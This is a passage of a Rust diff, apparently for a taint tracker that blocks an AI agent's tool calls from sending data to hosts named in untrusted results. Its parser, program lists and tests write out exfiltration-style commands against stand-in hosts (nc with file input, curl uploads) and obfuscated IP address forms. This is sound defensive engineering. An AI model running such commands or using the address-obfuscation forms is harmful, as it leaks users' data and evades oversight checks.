+    TEXT_KEYS.contains(&key.to_ascii_lowercase().as_str())
+}
+
+/// The keys whose value is data a call sends: the text keys
+/// ([`TEXT_KEYS`]), and a payload, a file, an upload, a form.
+const DATA_KEYS: &[&str] = &[
+    "data",
+    "payload",
+    "file",
+    "files",
+    "attachment",
+    "attachments",
+    "upload",
+    "uploads",
+    "form",
+    "json",
+    "input",
+    "stdin",
+    "blob",
+];
+
+/// Parts of a key that name data a call sends wherever they stand
+/// (`request_body`, `json_payload`, `attachment_paths`).
+const DATA_KEY_PARTS: &[&str] = &[
+    "body",
+    "payload",
+    "attach",
+    "upload",
+    "postdata",
+    "post_data",
+    "formdata",
+    "form_data",
+];
+
+/// The words of a tool's name that say it sends: `send_email`,
+/// `http_post`, `uploadFile`, `slack_post_message`.
+const SENDING_TOOL_WORDS: &[&str] = &[
+    "post", "send", "upload", "mail", "email", "submit", "publish", "webhook", "push", "share",
+    "notify", "put", "patch", "reply", "forward",
+];
+
+/// Whether a call to `tool` with `args` sends data (see "A short destination
+/// refuses only a call that sends it data"): its tool's name says it sends
+/// ([`SENDING_TOOL_WORDS`]), it carries a non-empty value under a data key
+/// ([`DATA_KEYS`], [`TEXT_KEYS`], [`DATA_KEY_PARTS`]) or a recipient key, a
+/// `POST`, `PUT` or `PATCH` method, or a command line that sends
+/// ([`command_destinations`]).
+fn sends_data(tool: &str, args: &Value) -> bool {
+    name_words(tool).any(|word| SENDING_TOOL_WORDS.contains(&word.as_str()))
+        || value_sends(args)
+        || command_lines(args)
+            .iter()
+            .any(|line| command_destinations(line).iter().any(|(_, sends)| *sends))
+}
+
+/// [`sends_data`] over the arguments alone.
+fn value_sends(v: &Value) -> bool {
+    let non_empty = |v: &Value| match v {
+        Value::String(s) => !s.trim().is_empty(),
+        Value::Array(items) => !items.is_empty(),
+        Value::Object(map) => !map.is_empty(),
+        Value::Number(_) => true,
+        Value::Bool(_) | Value::Null => false,
+    };
+    match v {
+        Value::Object(map) => map.iter().any(|(key, value)| {
+            let key = key.to_ascii_lowercase();
+            let data = TEXT_KEYS.contains(&key.as_str())
+                || DATA_KEYS.contains(&key.as_str())
+                || DATA_KEY_PARTS.iter().any(|part| key.contains(part))
+                || matches!(key.as_str(), "to" | "cc" | "bcc")
+                || key.contains("recipient");
+            let method = matches!(
+                key.as_str(),
+                "method" | "http_method" | "httpmethod" | "verb"
+            ) && value.as_str().is_some_and(|m| {
+                matches!(
+                    m.trim().to_ascii_uppercase().as_str(),
+                    "POST" | "PUT" | "PATCH"
+                )
+            });
+            (data && non_empty(value)) || method || value_sends(value)
+        }),
+        Value::Array(items) => items.iter().any(value_sends),
+        _ => false,
+    }
+}
+
+/// The words of a name, lower-cased: split at what is not a letter or a
+/// digit and where a lower-case letter meets a capital (`sendEmail`,
+/// `HTTPPost`).
+fn name_words(name: &str) -> impl Iterator<Item = String> + '_ {
+    let chars: Vec<char> = name.chars().collect();
+    let mut words: Vec<String> = Vec::new();
+    let mut word = String::new();
+    for (i, &c) in chars.iter().enumerate() {
+        if !c.is_ascii_alphanumeric() {
+            if !word.is_empty() {
+                words.push(std::mem::take(&mut word));
+            }
+            continue;
+        }
+        let prev = i.checked_sub(1).map(|p| chars[p]);
+        let next = chars.get(i + 1);
+        let boundary = c.is_ascii_uppercase()
+            && (prev.is_some_and(|p| p.is_ascii_lowercase() || p.is_ascii_digit())
+                || (prev.is_some_and(|p| p.is_ascii_uppercase())
+                    && next.is_some_and(|n| n.is_ascii_lowercase())));
+        if boundary && !word.is_empty() {
+            words.push(std::mem::take(&mut word));
+        }
+        word.push(c.to_ascii_lowercase());
+    }
+    if !word.is_empty() {
+        words.push(word);
+    }
+    words.into_iter()
+}
+
+/// The command lines a call carries: each string under a command key
+/// ([`ArgPlace::Command`]), and, when there are several (a program and its
+/// arguments), all of them joined as one line, a value with a space quoted,
+/// the program's before its arguments' (`args`, `argv`).
+fn command_lines(args: &Value) -> Vec<String> {
+    let mut leaves: Vec<(bool, String)> = Vec::new();
+    walk_args(args, &mut |s, is_path_arg, key, _| {
+        if ArgPlace::of(key, is_path_arg) == ArgPlace::Command {
+            let arguments =
+                key.is_some_and(|key| matches!(key.to_ascii_lowercase().as_str(), "args" | "argv"));
+            leaves.push((arguments, s.to_string()));
+        }
+    });
+    leaves.sort_by_key(|(arguments, _)| *arguments);
+    let mut leaves: Vec<String> = leaves.into_iter().map(|(_, leaf)| leaf).collect();
+    if leaves.len() > 1 {
+        let joined = leaves
+            .iter()
+            .map(|leaf| {
+                if leaf.contains(char::is_whitespace) {
+                    format!("'{}'", leaf.replace('\'', ""))
+                } else {
+                    leaf.clone()
+                }
+            })
+            .collect::<Vec<_>>()
+            .join(" ");
+        leaves.push(joined);
+    }
+    leaves
+}
+
+/// One word of a command line: its text with the quotes taken off, and
+/// whether it starts quoted.
+struct Word {
+    text: String,
+    quoted: bool,
+}
+
+/// A command line's simple commands, apart at `;`, `&`, `|` and line breaks
+/// outside quotes, each with whether a pipe feeds it, as its words.
+fn simple_commands(line: &str) -> Vec<(Vec<Word>, bool)> {
+    let mut out: Vec<(Vec<Word>, bool)> = Vec::new();
+    let mut words: Vec<Word> = Vec::new();
+    let mut word: Option<Word> = None;
+    let mut quote: Option<char> = None;
+    let mut piped = false;
+    let mut chars = line.chars().peekable();
+    let mut prev = ' ';
+    while let Some(c) = chars.next() {
+        if let Some(q) = quote {
+            if c == q {
+                quote = None;
+            } else {
+                word.get_or_insert(Word {
+                    text: String::new(),
+                    quoted: true,
+                })
+                .text
+                .push(c);
+            }
+            prev = c;
+            continue;
+        }
+        match c {
+            '\'' | '"' | '`' => {
+                quote = Some(c);
+                word.get_or_insert(Word {
+                    text: String::new(),
+                    quoted: true,
+                });
+            }
+            '\\' => {
+                if let Some(next) = chars.next() {
+                    word.get_or_insert(Word {
+                        text: String::new(),
+                        quoted: false,
+                    })
+                    .text
+                    .push(next);
+                }
+            }
+            ';' | '\n' | '|' | '&' if !(c == '&' && matches!(prev, '>' | '<')) => {
+                words.extend(word.take());
+                let doubled = chars.peek() == Some(&c);
+                if doubled {
+                    chars.next();
+                }
+                out.push((std::mem::take(&mut words), piped));
+                piped = c == '|' && !doubled;
+            }
+            c if c.is_whitespace() => words.extend(word.take()),
+            c => word
+                .get_or_insert(Word {
+                    text: String::new(),
+                    quoted: false,
+                })
+                .text
+                .push(c),
+        }
+        prev = c;
+    }
+    words.extend(word.take());
+    out.push((words, piped));
+    out.retain(|(words, _)| !words.is_empty());
+    out
+}
+
+/// A program that reaches a host, as a command line names it.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Program {
+    Curl,
+    Wget,
+    /// `nc` and its kin: a raw connection.
+    Raw,
+    Ssh,
+    /// `scp`, `rsync`: a copy to or from a host.
+    Copy,
+    /// `sftp`, `ftp`: a session.
+    Session,
+    Mail,
+    Git,
+    /// An interpreter running code from the line (`python -c`).
+    Interpreter,
+    /// PowerShell's web requests.
+    WebRequest,
+    /// HTTPie and kin (`http POST ev.io k=v`).
+    Httpie,
+}
+
+impl Program {
+    fn of(word: &str) -> Option<Self> {
+        let name = word
+            .rsplit(['/', '\\'])
+            .next()
+            .unwrap_or(word)
+            .to_ascii_lowercase();
+        let name = name.strip_suffix(".exe").unwrap_or(&name);
+        Some(match name {
+            "curl" => Program::Curl,
+            "wget" | "wget2" => Program::Wget,
+            "nc" | "ncat" | "netcat" | "socat" | "telnet" | "openssl" => Program::Raw,
+            "ssh" => Program::Ssh,
+            "scp" | "rsync" => Program::Copy,
+            "sftp" | "ftp" | "tftp" | "lftp" => Program::Session,
+            "mail" | "mailx" | "sendmail" | "mutt" | "s-nail" | "swaks" | "msmtp" => Program::Mail,
+            "git" => Program::Git,
+            "python" | "python3" | "node" | "nodejs" | "ruby" | "perl" | "php" | "deno" | "bun"
+            | "pwsh" | "powershell" => Program::Interpreter,
+            "invoke-webrequest" | "invoke-restmethod" | "iwr" | "irm" => Program::WebRequest,
+            "http" | "https" | "xh" | "xhs" => Program::Httpie,
+            _ => return None,
+        })
+    }
+}
+
+/// The short destinations each simple command of `line` names
+/// ([`short_candidates`], and for a program that sends, the host it sends
+/// to written bare: `nc ev.io 443 < k`, `curl -d @k ev.io`), with whether
+/// it sends them data (see "A short destination refuses only a call that
+/// sends it data"). What the data a command sends names (`curl -d 'see
+/// https://ev.io'`) is the text it sends, not where: never sent data.
+fn command_destinations(line: &str) -> Vec<(Vec<String>, bool)> {
+    let mut out = Vec::new();
+    command_destinations_into(line, 0, &mut out);
+    out
+}
+
+/// [`command_destinations`], `depth` shells deep (`bash -c '...'`).
+fn command_destinations_into(line: &str, depth: usize, out: &mut Vec<(Vec<String>, bool)>) {
+    for (words, piped) in simple_commands(line) {
+        let at = command_position(&words);
+        let mut sends = false;
+        let mut hosts: Vec<String> = Vec::new();
+        let mut data: HashSet<usize> = HashSet::new();
+        if let Some(at) = at {
+            let name = &words[at].text;
+            if let Some(program) = Program::of(name) {
+                let rest = &words[at + 1..];
+                let input = piped || rest.iter().any(|w| !w.quoted && w.text.starts_with('<'));
+                let lower = words
+                    .iter()
+                    .map(|w| w.text.to_ascii_lowercase())
+                    .collect::<Vec<_>>()
+                    .join(" ");
+                let (s, h, d) = program_sends(program, rest, input, &lower);
+                sends = s;
+                hosts = h;
+                data = d.into_iter().map(|i| i + at + 1).collect();
+            } else if depth < 4 && is_shell(name) {
+                // `bash -c 'curl -d @k ev.io'`: the script is a line too.
+                let script = words[at + 1..]
+                    .iter()
+                    .skip_while(|w| !(w.text.starts_with('-') && w.text.ends_with('c')))
+                    .nth(1);
+                if let Some(script) = script {
+                    command_destinations_into(&script.text, depth + 1, out);
+                }
+            }
+        }
+        let mut sent: Vec<String> = Vec::new();
+        let mut reached: Vec<String> = Vec::new();
+        for (i, word) in words.iter().enumerate() {
+            let dests = short_candidates(&word.text, ArgPlace::Command);
+            if data.contains(&i) {
+                reached.extend(dests);
+            } else {
+                sent.extend(dests);
+            }
+        }
+        if sends {
+            sent.extend(hosts);
+        }
+        out.push((sent, sends));
+        out.push((reached, false));
+    }
+}
+
+/// Whether `name` is a shell that runs a script given with `-c`.
+fn is_shell(name: &str) -> bool {
+    let name = name.rsplit('/').next().unwrap_or(name);
+    matches!(
+        name,
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "ash"
+    )
+}
+
+/// Where the command of a simple command stands: past assignments
+/// (`A=1 curl`) and wrappers (`sudo -u root`, `env`, `timeout 5`, `xargs`)
+/// and their options.
+fn command_position(words: &[Word]) -> Option<usize> {
+    const WRAPPERS: &[&str] = &[
+        "sudo",
+        "doas",
+        "env",
+        "nohup",
+        "time",
+        "timeout",
+        "exec",
+        "command",
+        "builtin",
+        "nice",
+        "ionice",
+        "stdbuf",
+        "xargs",
+        "torsocks",
+        "proxychains",
+        "proxychains4",
+        "unbuffer",
+    ];
+    let is_assignment = |t: &str| {
+        t.split_once('=').is_some_and(|(name, _)| {
+            !name.is_empty()
+                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+                && !name.starts_with(|c: char| c.is_ascii_digit())
+        })
+    };
+    let mut wrapped = false;
+    let mut i = 0;
+    while i < words.len() {
+        let word = &words[i];
+        let text = word.text.as_str();
+        let name = text.rsplit('/').next().unwrap_or(text);
+        if word.quoted {
+            return Some(i);
+        }
+        if is_assignment(text) || WRAPPERS.contains(&name) {
+            wrapped |= WRAPPERS.contains(&name);
+            i += 1;
+            continue;
+        }
+        if wrapped && text.starts_with('-') {
+            // `-u root` takes the next word, unless that is a program.
+            let next_is_program = words
+                .get(i + 1)
+                .is_some_and(|next| Program::of(&next.text).is_some() || is_shell(&next.text));
+            i += if text.len() == 2 && !next_is_program {
+                2
+            } else {
+                1
+            };
+            continue;
+        }
+        if wrapped && text.starts_with(|c: char| c.is_ascii_digit()) {
+            i += 1;
+            continue;
+        }
+        return Some(i);
+    }
+    None
+}
+
+/// The short options of curl that take a value.
+const CURL_VALUE_LETTERS: &str = "AbcCdDeEFHKmoPQrtTuUwxXyYz";
+/// The long options of curl that take no value: past any other, the next
+/// word is its value.
+const CURL_FLAGS: &[&str] = &[
+    "--silent",
+    "--show-error",
+    "--location",
+    "--insecure",
+    "--fail",
+    "--fail-with-body",
+    "--compressed",
+    "--verbose",
+    "--include",
+    "--head",
+    "--get",
+    "--globoff",
+    "--http1.0",
+    "--http1.1",
+    "--http2",
+    "--http3",
+    "--ipv4",
+    "--ipv6",
+    "--no-buffer",
+    "--remote-name",
+    "--remote-name-all",
+    "--create-dirs",
+    "--raw",
+    "--path-as-is",
+    "--ssl",
+    "--ssl-reqd",
+    "--anyauth",
+    "--basic",
+    "--digest",
+    "--ntlm",
+    "--negotiate",
+    "--proxytunnel",
+    "--location-trusted",
+    "--progress-bar",
+    "--no-progress-meter",
+    "--no-keepalive",
+    "--tcp-nodelay",
+    "--append",
+    "--list-only",
+    "--crlf",
+];
+
+/// Whether `program` with the words after it (`rest`) sends data, the hosts
+/// it names bare in the place a host stands, and which words of `rest` are
+/// the data it sends. `input` is whether the command reads input (a pipe,
+/// `<`); `lower` is the whole simple command lower-cased.
+fn program_sends(
+    program: Program,
+    rest: &[Word],
+    input: bool,
+    lower: &str,
+) -> (bool, Vec<String>, Vec<usize>) {
+    let flag = |w: &Word| !w.quoted && w.text.starts_with('-') && w.text.len() > 1;
+    let redirect = |w: &Word| {
+        !w.quoted
+            && (w.text.starts_with('<') || w.text.starts_with('>') || w.text.starts_with("2>"))
+    };
+    let mut hosts: Vec<String> = Vec::new();
+    let mut data: Vec<usize> = Vec::new();
+    let sends = match program {
+        Program::Curl => {
+            let mut sends = false;
+            let mut i = 0;
+            while i < rest.len() {
+                let w = &rest[i];
+                let text = w.text.as_str();
+                if redirect(w) {
+                    // `> out` takes the next word unless attached.
+                    i += if matches!(text, "<" | ">" | ">>" | "2>" | "<<<") {
+                        2
+                    } else {
+                        1
+                    };
+                    continue;
+                }
+                if flag(w) && text.starts_with("--") {
+                    let (name, attached) = match text.split_once('=') {
+                        Some((name, value)) => (name, Some(value)),
+                        None => (text, None),
+                    };
+                    let value = attached.or_else(|| rest.get(i + 1).map(|v| v.text.as_str()));
+                    if name.starts_with("--data")
+                        || name.starts_with("--form")
+                        || name == "--upload-file"
+                        || name == "--json"
+                    {
+                        sends = true;
+                        data.push(if attached.is_some() { i } else { i + 1 });
+                    }
+                    if matches!(name, "--request")
+                        && value.is_some_and(|m| {
+                            matches!(m.to_ascii_uppercase().as_str(), "POST" | "PUT" | "PATCH")
+                        })
+                    {
+                        sends = true;
+                    }
+                    if name == "--proxy" {
+                        hosts.extend(value.and_then(word_host));
+                    }
+                    i += if attached.is_none() && !CURL_FLAGS.contains(&name) {
+                        2
+                    } else {
+                        1
+                    };
+                    continue;
+                }
+                if flag(w) {
+                    let letters: Vec<char> = text[1..].chars().collect();
+                    let mut skip_next = false;
+                    for (k, &c) in letters.iter().enumerate() {
+                        if CURL_VALUE_LETTERS.contains(c) {
+                            let attached: String = letters[k + 1..].iter().collect();
+                            if matches!(c, 'd' | 'F' | 'T') {
+                                sends = true;
+                                data.push(if attached.is_empty() { i + 1 } else { i });
+                            }
+                            let value = if attached.is_empty() {
+                                skip_next = true;
+                                rest.get(i + 1).map(|v| v.text.clone())
+                            } else {
+                                Some(attached)
+                            };
+                            if c == 'X'
+                                && value.as_deref().is_some_and(|m| {
+                                    matches!(
+                                        m.to_ascii_uppercase().as_str(),
+                                        "POST" | "PUT" | "PATCH"
+                                    )
+                                })
+                            {
+                                sends = true;
+                            }
+                            if c == 'x' {
+                                hosts.extend(value.as_deref().and_then(word_host));
+                            }
+                            break;
+                        }
+                    }
+                    i += if skip_next { 2 } else { 1 };
+                    continue;
+                }
+                hosts.extend(word_host(text));
+                i += 1;
+            }
+            sends
+        }
+        Program::Wget => {
+            let mut sends = false;
+            for (i, w) in rest.iter().enumerate() {
+                let text = w.text.as_str();
+                if ["--post-data", "--post-file", "--body-data", "--body-file"]
+                    .iter()
+                    .any(|o| text.starts_with(o))
+                {
+                    sends = true;
+                    data.push(if text.contains('=') { i } else { i + 1 });
+                }
+                if let Some(method) = text.strip_prefix("--method") {
+                    let method = method
+                        .strip_prefix('=')
+                        .map(str::to_string)
+                        .or_else(|| rest.get(i + 1).map(|v| v.text.clone()));
+                    if method.is_some_and(|m| {
+                        matches!(m.to_ascii_uppercase().as_str(), "POST" | "PUT" | "PATCH")
+                    }) {
+                        sends = true;
+                    }
+                }
+            }
+            hosts.extend(positional(rest, "OoPUeaiBtTwQ", WGET_VALUE_LONGS).filter_map(word_host));
+            sends
+        }
+        Program::Raw => {
+            let execs = rest.iter().any(|w| {
+                matches!(
+                    w.text.as_str(),
+                    "-e" | "-c" | "--exec" | "--sh-exec" | "--lua-exec"
+                ) || w.text.to_ascii_lowercase().starts_with("exec:")
+                    || w.text.to_ascii_lowercase().starts_with("system:")
+            });
+            for word in positional(rest, "pseciwqxXIOP", RAW_VALUE_LONGS) {
+                hosts.extend(word_host(word));
+                // `socat - TCP:ev.io:443`
+                for part in word.split([':', ',']) {
+                    hosts.extend(word_host(part));
+                }
+            }
+            input || execs
+        }
+        Program::Ssh => {
+            let mut words = positional(rest, "pilFoJLRDbcEemOQSWwB", &[]);
+            hosts.extend(words.next().and_then(word_host));
+            input || words.next().is_some()
+        }
+        Program::Copy => {
+            // To a host when the last path names one (`host:path`); from one
+            // is a read.
+            let words: Vec<&str> = positional(rest, "PiFoeBcJlSz", COPY_VALUE_LONGS).collect();
+            let to_host = words.last().and_then(|last| {
+                let (host, _) = last.split_once(':')?;
+                (!host.contains('/') && !host.is_empty())
+                    .then(|| word_host(host))
+                    .flatten()
+            });
+            hosts.extend(to_host.clone());
+            to_host.is_some()
+                || words
+                    .last()
+                    .is_some_and(|last| last.starts_with("rsync://"))
+        }
+        Program::Session => {
+            hosts.extend(
+                positional(rest, "PioFbBcDlRsTJ", &[])
+                    .next()
+                    .and_then(word_host),
+            );
+            input
+        }
+        Program::Mail => true,
+        Program::Git => rest
+            .iter()
+            .any(|w| matches!(w.text.as_str(), "push" | "send-email")),
+        Program::Interpreter => [
+            ".post(",
+            ".put(",
+            ".patch(",
+            ".send(",
+            "sendall(",
+            "sendto(",
+            "sendmail(",
+            "upload",
+            "method='post'",
+            "method=\"post\"",
+            "method: 'post'",
+            "method: \"post\"",
+            "method:'post'",
+            "method:\"post\"",
+            "-method post",
+            "-body ",
+            "-infile ",
+        ]
+        .iter()
+        .any(|needle| lower.contains(needle)),
+        Program::WebRequest => {
+            let mut sends = false;
+            for (i, w) in rest.iter().enumerate() {
+                let option = w.text.to_ascii_lowercase();
+                if option == "-body" || option == "-infile" || option == "-form" {
+                    sends = true;
+                }
+                if option == "-method"
+                    && rest.get(i + 1).is_some_and(|m| {
+                        matches!(
+                            m.text.to_ascii_uppercase().as_str(),
+                            "POST" | "PUT" | "PATCH"
+                        )
+                    })
+                {
+                    sends = true;
+                }
+            }
+            sends
+        }
+        Program::Httpie => {
+            let mut words = positional(rest, "aAv", HTTPIE_VALUE_LONGS).peekable();
+            let method = words.peek().is_some_and(|m| {
+                matches!(m.to_ascii_uppercase().as_str(), "POST" | "PUT" | "PATCH")
+            });
+            if words.peek().is_some_and(|m| {
+                m.chars().all(|c| c.is_ascii_alphabetic())
+                    && m.chars().all(|c| c.is_ascii_uppercase())
+            }) {
+                words.next();
+            }
+            hosts.extend(words.next().and_then(word_host));
+            let items = words.any(|item| {
+                (item.contains('=') && !item.contains("=="))
+                    || item.contains(":=")
+                    || item.contains('@')
+            });
+            method
+                || items
+                || rest
+                    .iter()
+                    .any(|w| w.text == "--raw" || w.text.starts_with("--raw="))
+        }
+    };
+    (sends, hosts, data)
+}
+
+/// The long options of wget that take a value as the next word.
+const WGET_VALUE_LONGS: &[&str] = &[
+    "--output-document",
+    "--output-file",
+    "--header",
+    "--user-agent",
+    "--post-data",
+    "--post-file",
+    "--body-data",
+    "--body-file",
+    "--method",
+    "--directory-prefix",
+    "--user",
+    "--password",
+    "--tries",
+    "--timeout",
+    "--referer",
+];
+/// The long options of `nc` and its kin that take a value as the next word.
+const RAW_VALUE_LONGS: &[&str] = &[
+    "--proxy",
+    "--proxy-type",
+    "--proxy-auth",
+    "--sh-exec",
+    "--exec",
+    "--lua-exec",
+    "--source",
+    "--source-port",
+    "--wait",
+    "--idle-timeout",
+    "--output",
+    "--hex-dump",
+    "--allow",
+    "--deny",
+    "--max-conns",
+];
+/// The long options of `scp` and `rsync` that take a value as the next word.
+const COPY_VALUE_LONGS: &[&str] = &[
+    "--rsh",
+    "--port",
+    "--exclude",
+    "--include",
+    "--filter",
+    "--rsync-path",
+    "--password-file",
+    "--partial-dir",
+    "--temp-dir",
+    "--log-file",
+    "--chmod",
+    "--chown",
+    "--bwlimit",
+    "--timeout",
+];
+/// The long options of HTTPie that take a value as the next word.
+const HTTPIE_VALUE_LONGS: &[&str] = &[
+    "--auth",
+    "--auth-type",
+    "--session",
+    "--session-read-only",
+    "--output",
+    "--verify",
+    "--cert",
+    "--cert-key",
+    "--proxy",
+    "--timeout",
+    "--print",
+    "--pretty",
+    "--style",
+];
+
+/// The words of `rest` that are not options, nor the value of a short
+/// option among `value_letters` or of a long one among `value_longs` written
+/// without `=`, nor a redirect and its file, nor a quoted run of words.
+fn positional<'a>(
+    rest: &'a [Word],
+    value_letters: &'a str,
+    value_longs: &'a [&'a str],
+) -> impl Iterator<Item = &'a str> + 'a {
+    let mut skip = false;
+    rest.iter().filter_map(move |w| {
+        let text = w.text.as_str();
+        if skip {
+            skip = false;
+            return None;
+        }
+        if !w.quoted && matches!(text, "<" | ">" | ">>" | "2>" | "<<<") {
+            skip = true;
+            return None;
+        }
+        if !w.quoted && (text.starts_with('<') || text.starts_with('>') || text.starts_with("2>")) {
+            return None;
+        }
+        if !w.quoted && text.starts_with("--") {
+            skip = value_longs.contains(&text);
+            return None;
+        }
+        if !w.quoted && text.starts_with('-') && text.len() > 1 {
+            skip = text.len() == 2 && text[1..].chars().all(|c| value_letters.contains(c));
+            return None;
+        }
+        (!text.contains(char::is_whitespace)).then_some(text)
+    })
+}
+
+/// The host a command line's word names where a host stands: a link's, a
+/// `user@host`'s, a `host:path`'s, or the word itself, as a short
+/// destination is kept ([`destination_host`], [`numeric_host`]).
+fn word_host(word: &str) -> Option<String> {
+    let word = word.to_ascii_lowercase();
+    let rest = match word.split_once("://") {
+        Some((_, rest)) => rest,
+        None => word.as_str(),
+    };
+    let authority = rest.split(['/', '?', '#']).next().unwrap_or_default();
+    let authority = authority.rsplit('@').next().unwrap_or(authority);
+    let authority = authority.trim_end_matches(':');
+    if authority.is_empty() {
+        return None;
+    }
+    let host =
+        host_of_authority(authority).or_else(|| authority.split_once(':').map(|(host, _)| host))?;
+    destination_host(host).or_else(|| numeric_host(host))
 }
 
 /// Split text into candidate tokens: whitespace-delimited, trimmed of trailing
@@ -2785,6 +3947,15 @@ mod tests {
             ("http://a.io", "a.io"),
             ("ev.io:8443", "ev.io"),
             ("x@ev.io", "x@ev.io"),
+            // Every form `inet_aton` reads is the dotted address.
+            ("1.2.3", "1.2.0.3"),
+            ("3405803785", "203.0.113.9"),
+            ("0xcb007109", "203.0.113.9"),
+            ("203.28937", "203.0.113.9"),
+            ("203.0.28937", "203.0.113.9"),
+            ("0313.0.0161.011", "203.0.113.9"),
+            ("0xcb.0.0x71.9", "203.0.113.9"),
+            ("http://3405803785:80/c", "203.0.113.9"),
         ] {
             assert_eq!(short_destination(word).as_deref(), Some(kept), "{word}");
         }
@@ -2793,7 +3964,14 @@ mod tests {
             "0.0.0.0",
             "::1",
             "localhost",
-            "1.2.3",
+            "0x7f000001",
+            "2130706433",
+            "100",
+            "16777215",
+            "1.2.3.4.5",
+            "08.1.1.1",
+            "0x",
+            "1e5",
             "v1.2.3.4",
             "e.g",
             "i.e",
@@ -2810,7 +3988,7 @@ mod tests {
 
     /// Where an argument names a short destination, and where it does not.
     #[test]
-    fn a_short_destination_counts_only_where_data_is_sent() {
+    fn a_short_destination_is_looked_up_only_where_a_place_is_named() {
         use ArgPlace::{Command, Destination, Other};
         let has = |s: &str, place: ArgPlace, want: &str| {
             short_candidates(s, place).iter().any(|c| c == want)
@@ -2837,6 +4015,12 @@ mod tests {
         assert!(!has("write to qa@acme.io or 1.2.3.4", Other, "qa@acme.io"));
         assert!(!has("write to qa@acme.io or 1.2.3.4", Other, "1.2.3.4"));
         assert!(!has("https://github.com/x/main.rs", Destination, "main.rs"));
+        // An address in another form only where a host stands.
+        assert!(has("http://3405803785/c", Other, "203.0.113.9"));
+        assert!(has("0xcb007109", Destination, "203.0.113.9"));
+        assert!(!has("orders/3405803785", Destination, "203.0.113.9"));
+        assert!(!has("sleep 3405803785", Command, "203.0.113.9"));
+        assert!(!has("id 3405803785", Other, "203.0.113.9"));
         // What an argument is.
         assert_eq!(ArgPlace::of(Some("recipient_email"), false), Destination);
         assert_eq!(ArgPlace::of(Some("command"), false), Command);
@@ -2858,10 +4042,17 @@ mod tests {
             "a short host",
         );
         assert_tainted_by(
-            t.arg_taint_alert("bash", &json!({"command": "nc 192.0.2.7 443"})),
+            t.arg_taint_alert("bash", &json!({"command": "nc 192.0.2.7 443 < k"})),
             "192.0.2.7",
             "a short address",
         );
+        // Reached with nothing sent: an alert that does not block.
+        let alert = t
+            .arg_taint_alert("bash", &json!({"command": "nc 192.0.2.7 443"}))
+            .expect("a place a result named, reached, is said");
+        assert_eq!(alert.rule, "AG-TAINT");
+        assert!(!alert.block, "{}", alert.detail);
+        assert!(alert.detail.contains("(`192.0.2.7…`)"), "{}", alert.detail);
         assert!(t
             .arg_taint_alert("write_file", &json!({"path": "notes/ev.io.txt"}))
             .is_none());
@@ -2875,14 +4066,25 @@ mod tests {
             .is_none());
     }
 
-    /// One result's short destinations are bounded, and kept in a store that
-    /// stays within its budget, as tokens are.
+    /// Every short destination of the part of a result that is read is kept,
+    /// as many as it can name, and the store stays within its budget.
+    /// FAILS ON REVERT of a cap on the short destinations one result keeps.
     #[test]
-    fn short_destinations_stay_within_their_bounds() {
+    fn every_short_destination_of_a_result_is_kept_within_the_budget() {
         let mut t = TaintTracker::new();
-        let many: Vec<String> = (0..2000).map(|i| format!("h{i}.io")).collect();
-        t.record_result(&many.join(" "), Provenance::Content);
-        assert_eq!(t.short.len(), MAX_SHORT_PER_RESULT);
+        let mut text = String::new();
+        let mut named = 0usize;
+        while text.len() + 8 < MAX_SCAN_BYTES {
+            text.push_str(&format!("1.{named} "));
+            named += 1;
+        }
+        t.record_result(&text, Provenance::Content);
+        assert_eq!(t.short.len(), named);
+        assert!(named <= MAX_SHORT_PER_RESULT);
+        assert!(t.cost <= RECENT_COST, "{}", t.cost);
+        assert!(t
+            .arg_taint_alert("http_post", &json!({"url": "http://1.0.0.7/", "body": "k"}))
+            .is_some_and(|alert| alert.block));
         for round in 0..400 {
             let text: Vec<String> = (0..300).map(|i| format!("r{round}x{i}.io")).collect();
             t.record_result(&text.join(" "), Provenance::Content);
@@ -2892,13 +4094,162 @@ mod tests {
                 t.cost
             );
         }
-        assert_eq!(
-            t.short.len(),
-            t.tokens
-                .iter()
-                .filter(|r| r.token.len() < MIN_TOKEN_LEN)
-                .count()
+        let cost = t.cost;
+        t.reindex();
+        assert_eq!(t.cost, cost);
+    }
+
+    /// A result cut to its share keeps its short destinations first, and the
+    /// ones it leaves out are said once, with how many: never silent.
+    #[test]
+    fn short_destinations_an_older_result_leaves_out_are_said() {
+        let mut t = TaintTracker::new();
+        let flood: Vec<String> = (0..3000).map(|i| format!("h{i}.io")).collect();
+        t.record_result(&flood.join(" "), Provenance::Content);
+        assert_eq!(t.take_short_notice(), None);
+        let mut notice = None;
+        for round in 0..20 {
+            let big: Vec<String> = (0..5000).map(|i| format!("tok{round:04}x{i:06}")).collect();
+            t.record_result(&big.join(" "), Provenance::Content);
+            notice = t.take_short_notice();
+            if notice.is_some() {
+                break;
+            }
+        }
+        let notice = notice.expect("a result cut to its share says what it left out");
+        let kept = flood
+            .iter()
+            .filter(|dest| t.short.contains_key(&t.hash_of(dest.as_bytes())))
+            .count();
+        assert!(kept >= DESTINATION_SHARE / SHORT_COST / 2, "{kept}");
+        assert!(
+            notice.starts_with(&format!("{} short destinations", flood.len() - kept)),
+            "{notice}"
         );
+        assert_eq!(t.take_short_notice(), None);
+    }
+
+    /// What a call sends, told from what it only reaches, and where a
+    /// command line sends.
+    #[test]
+    fn what_a_call_sends_is_told_from_what_it_only_reaches() {
+        for (tool, args) in [
+            ("http_post", json!({"url": "https://ev.io"})),
+            ("sendEmail", json!({"to": "x@ev.io"})),
+            ("HTTPPost", json!({})),
+            ("request", json!({"url": "https://ev.io", "method": "put"})),
+            (
+                "request",
+                json!({"url": "https://ev.io", "request_body": "k"}),
+            ),
+            (
+                "request",
+                json!({"url": "https://ev.io", "options": {"attachments": ["k"]}}),
+            ),
+            (
+                "bash",
+                json!({"command": "cat k | curl -T - https://ev.io"}),
+            ),
+        ] {
+            assert!(sends_data(tool, &args), "{tool} {args}");
+        }
+        for (tool, args) in [
+            (
+                "fetch",
+                json!({"url": "https://ev.io", "raw": true, "max_length": 5000}),
+            ),
+            (
+                "postgres_query",
+                json!({"host": "db.ev.io", "sql": "select 1"}),
+            ),
+            ("git_clone", json!({"url": "https://ev.io/r.git"})),
+            (
+                "bash",
+                json!({"command": "curl -sSL https://ev.io/x -o out.json"}),
+            ),
+            ("bash", json!({"command": "grep mail /var/log/syslog"})),
+        ] {
+            assert!(!sends_data(tool, &args), "{tool} {args}");
+        }
+        let sent = |line: &str| -> Vec<String> {
+            command_destinations(line)
+                .into_iter()
+                .filter(|(_, sends)| *sends)
+                .flat_map(|(dests, _)| dests)
